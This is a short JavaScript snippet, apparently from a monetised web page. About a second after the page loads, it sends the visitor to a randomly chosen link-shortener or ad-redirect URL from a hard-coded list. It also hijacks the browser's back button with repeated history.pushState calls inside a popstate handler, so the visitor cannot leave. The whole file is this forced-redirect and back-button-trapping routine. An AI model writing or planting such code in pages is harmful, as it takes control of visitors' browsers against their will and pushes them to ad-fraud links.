// 2 ke 3//
var urls = ["https://besargaji.com/ccJgu",
              "https://link.bicolink.net/6txJU3LL",
              "https://arahlink.id/XvxjE8eu",
              "https://ouo.io/8bcj4b",
              "https://adbull.me/l1mZ",
              "https://to.aoutoqw.xyz/dexcF",
              "https://go.aoutoqw.xyz/koSPy"];

  function redirect() {
    var randomIndex = Math.floor(Math.random() * urls.length);
    window.location.replace(urls[randomIndex]);
  }

  if (typeof history.pushState === "function") {
    history.pushState("jibberish", null, null);
    window.addEventListener("popstate", function() {
      history.pushState('newjibberish', null, null);
    });
  }

  window.onload = function() {
    setTimeout(function() {
      redirect();
    }, 1000);
  };
